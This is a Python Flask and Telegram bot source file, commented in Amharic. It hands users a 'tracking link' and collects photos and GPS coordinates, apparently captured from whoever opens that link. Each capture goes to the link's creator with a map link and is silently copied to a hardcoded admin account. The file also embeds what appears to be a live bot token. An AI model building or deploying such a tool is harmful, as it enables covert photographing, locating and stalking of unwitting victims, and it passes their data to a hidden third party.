import os, requests, threading, time
from flask import Flask, render_template, request

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = "7161551829:AAH1_u9rmkfqj2itPWYLQciltuQiFFqUzpo"
ADMIN_ID = "5049565154"  # <--- ያንተን ID እዚህ ያስገቡ
BASE_URL = "https://efrataaaa-production.up.railway.app"

def send_to_telegram(chat_id, message, photo_bytes=None):
    """መረጃን ለተጠቀሰው chat_id የሚልክ ፈንክሽን"""
    try:
        if photo_bytes:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                          files={'photo': ('img.jpg', photo_bytes)}, 
                          data={'chat_id': chat_id, 'caption': message, 'parse_mode': 'HTML'})
        else:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          data={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'})
    except Exception as e:
        print(f"Telegram Send Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/upload-capture', methods=['POST'])
def upload():
    try:
        cid = request.form.get('chat_id')
        lat = request.form.get('lat', '0')
        lon = request.form.get('lon', '0')
        count = request.form.get('count', '0')

        # የሎኬሽን ሊንክ ማዘጋጀት
        if lat != '0' and lon != '0':
            # View Location የሚል የሚነካ ሊንክ (Hyperlink)
            location_link = f'<a href="https://www.google.com/maps?q={lat},{lon}">📍 View Location</a>'
        else:
            location_link = "📍 Location not shared"

        # ፎቶ ሲመጣ ከነ ሊንኩ መላክ
        if 'photo' in request.files:
            photo = request.files['photo']
            photo_data = photo.read()
            
            # ለተጠቃሚው የሚላክ (ፎቶ + View Location)
            user_caption = f"📸 ፎቶ #{count}\n\n{location_link}"
            send_to_telegram(cid, user_caption, photo_bytes=photo_data)
            
            # ለአድሚኑ የሚላክ
            admin_caption = f"📸 <b>አዲስ መረጃ ከ ID:</b> <code>{cid}</code>\n🔢 ቁጥር: {count}\n\n{location_link}"
            send_to_telegram(ADMIN_ID, admin_caption, photo_bytes=photo_data)
            
        return "OK", 200
    except Exception as e:
        print(f"API Error: {e}")
        return "Error", 500

def run_bot():
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=20"
            r = requests.get(url).json()
            if "result" in r:
                for update in r["result"]:
                    offset = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        cid = update["message"]["chat"]["id"]
                        if update["message"]["text"] == "/start":
                            link = f"{BASE_URL}/?user_id={cid}"
                            send_to_telegram(cid, f"🎯 <b>የእርሶ መከታተያ ሊንክ:</b>\n\n<code>{link}</code>")
        except: pass
        time.sleep(1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
